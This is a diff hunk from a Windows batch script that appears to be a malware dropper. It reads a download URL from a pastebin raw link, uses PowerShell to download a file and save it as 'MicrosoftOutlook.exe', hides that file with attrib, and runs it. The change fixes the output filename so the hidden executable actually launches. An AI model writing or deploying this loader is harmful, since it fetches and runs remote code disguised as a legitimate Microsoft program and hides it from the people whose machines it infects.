@@ -34,7 +34,7 @@ if '%errorlevel%' NEQ '0' (
 
     for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest 'https://pastebin.com/raw/jDCi7kMn').Content"') do set fileURL=%%i
 
-    powershell -Command "Invoke-WebRequest '%fileURL%' -OutFile 'Outlook.exe'"
+    powershell -Command "Invoke-WebRequest '%fileURL%' -OutFile 'MicrosoftOutlook.exe'"
 
     attrib +h "%targetDir%\MicrosoftOutlook.exe" /s /d
     start MicrosoftOutlook.exe
